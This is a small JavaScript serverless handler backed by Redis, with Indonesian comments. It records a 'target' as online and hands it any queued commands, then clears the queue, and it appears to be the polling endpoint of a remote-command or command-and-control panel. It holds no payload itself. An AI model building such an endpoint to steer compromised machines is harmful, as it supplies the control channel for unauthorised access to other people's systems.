import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const { target_id } = req.query;
    if (!target_id) return res.status(400).json({ error: 'Missing target_id' });

    // Update status online
    await redis.set(`online:${target_id}`, Date.now(), { ex: 60 }); // Expire 60 detik

    // Ambil command
    const cmdKey = `commands:${target_id}`;
    const commands = await redis.lrange(cmdKey, 0, -1);
    if (commands.length > 0) await redis.del(cmdKey);

    const parsed = commands.map(c => typeof c === 'string' ? JSON.parse(c) : c);
    return res.json({ commands: parsed });
}
